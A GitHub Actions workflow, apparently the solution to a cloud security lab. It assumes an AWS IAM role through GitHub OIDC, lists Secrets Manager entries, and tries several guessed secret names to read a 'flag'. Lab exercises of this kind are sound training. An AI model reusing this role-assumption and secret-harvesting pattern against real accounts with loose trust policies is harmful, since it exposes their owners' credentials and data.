name: Assume AWS Role via GitHub OIDC - sts-lab-2-target

on:
  workflow_dispatch:     # Allows you to trigger manually from GitHub UI
  push:
    branches: [ main ]

permissions:
  id-token: write        # Required for OIDC token
  contents: read

jobs:
  assume-and-read-flag:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Configure AWS Credentials (OIDC)
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::152815104156:role/sts-lab-2-target
          role-session-name: github-oidc-lab
          audience: sts.amazonaws.com
          aws-region: us-east-1          # ← This was missing! (most common default)

      - name: Verify assumed identity
        run: aws sts get-caller-identity

      - name: List Secrets
        run: aws secretsmanager list-secrets --query 'SecretList[].Name' --output table

      - name: Read the Flag
        run: |
          echo "=== Trying common secret names ==="
          aws secretsmanager get-secret-value --secret-id flag --query 'SecretString' --output text 2>/dev/null || \
          aws secretsmanager get-secret-value --secret-id lab-flag --query 'SecretString' --output text 2>/dev/null || \
          aws secretsmanager get-secret-value --secret-id secret --query 'SecretString' --output text 2>/dev/null || \
          aws secretsmanager get-secret-value --secret-id sts-lab-2-flag --query 'SecretString' --output text 2>/dev/null || \
          echo "[-] Flag not found. Check the list-secrets output above."